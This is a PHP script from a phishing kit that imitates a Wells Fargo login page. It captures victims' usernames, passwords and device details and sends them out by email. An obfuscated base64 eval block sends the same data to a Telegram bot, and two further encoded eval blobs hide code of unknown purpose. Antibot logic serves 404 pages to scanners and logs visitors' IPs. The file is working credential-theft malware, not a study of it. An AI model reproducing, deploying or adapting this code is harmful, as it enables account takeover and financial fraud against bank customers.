<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';
    require_once '../../config.php';
    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['username'],
        $_POST['password']
    )) {
        if (!$comps->checkEmpty(
            $_POST['username'],
            $_POST['password']
        )) {
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['password'] = $_POST['password'];
$content="
            [+]━━━━━━━━━━━━【🔑 login :Wells Fargo V1.0】━━━━━━━━━━━━━━━━━━━[+]
[👤 user]  = ".$_SESSION['username'] ."
[👤 pass]  = ".$_SESSION['password'] ."
[👤 Device Info]  = ".$comps->userDetails() ;


      

            if (isset($settings['LoginTwice']) && $settings['LoginTwice'] == "on") {
                if (!isset($_SESSION['loginTwice']) || !$_SESSION['loginTwice']) {
                    $_SESSION['loginTwice'] = 1;


 eval(base64_decode('CiBnb3RvIERSbGtNOyB5RWU0UzogJGNoYXRpZCA9ICJcNTVceDMxXDYwXHgzMFx4MzFceDM3XDYyXHgzMFx4MzNceDM2XDY2XDY0XHgzM1x4MzkiOyBnb3RvIFVJNFhuOyBEUmxrTTogJGFwaSA9ICJcNjJceDMwXDYzXHgzNVx4MzNceDMxXHgzOFx4MzdcNzBcNjBceDNhXDEwMVwxMDFceDQ2XHg0Nlw3MVx4MzVceDU3XHgzNFwxNDFceDM5XHg1MVx4MzRceDcxXHg2Y1wxMDFceDQzXDEwN1x4NmFceDY1XHg0Y1wxMjBcMTMwXHg3YVwxNjNceDQ0XHg1NFw2NFwxNDVceDZiXDE3MVx4NGRcMTI2XDExN1w2MFwxMTEiOyBnb3RvIHlFZTRTOyBVSTRYbjogZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XDE2NFx4NzBceDczXDcyXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRcMTQ1XDE1NFwxNDVcMTQ3XHg3Mlx4NjFceDZkXDU2XDE1N1wxNjJceDY3XHgyZlx4NjJcMTU3XDE2NCIgLiAkYXBpIC4gIlx4MmZceDczXDE0NVx4NmVceDY0XHg0ZFwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NVw3N1wxNDNceDY4XDE0MVwxNjRcMTM3XDE1MVx4NjRceDNkIiAuICRjaGF0aWQgLiAiXDQ2XHg3NFwxNDVceDc4XHg3NFw3NSIgLiB1cmxlbmNvZGUoJGNvbnRlbnQpIC4gJycpOyBnb3RvIFczZElEOyBXM2RJRDog')); 


                    if ($comps->mailX("(1) Login | Wells Fargo", $content)) {
                    
                        $comps->log(
                            "../../Export/key/live.txt",
                            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Login\n\n"
                        );
                        die($comps->headerX("../../Login/"));
                    } else {
                        die($antibot->throw404());
                    }
                }
            
                if (isset($_SESSION['loginTwice']) && $_SESSION['loginTwice']) {
                    unset($_SESSION['loginTwice']);
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

                    if ($comps->mailX("(2) Login | Wells Fargo", $content)) {
                  
                        $comps->log(
                            "../../Export/key/live.txt",
                            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (2) Login\n\n"
                        );
                        die($comps->headerX("../../Login/billing.php"));
                    } else {
                        die($antibot->throw404());
                    }
                }
            } else {
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

                if ($comps->mailX("(1) Login | Wells Fargo", $content)) {
                    
                    $comps->log(
                        "../../Export/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Login\n\n"
                    );
                    die($comps->headerX("../../Login/billing.php"));
                } else {
                    die($antibot->throw404());
                }
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Export/key/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }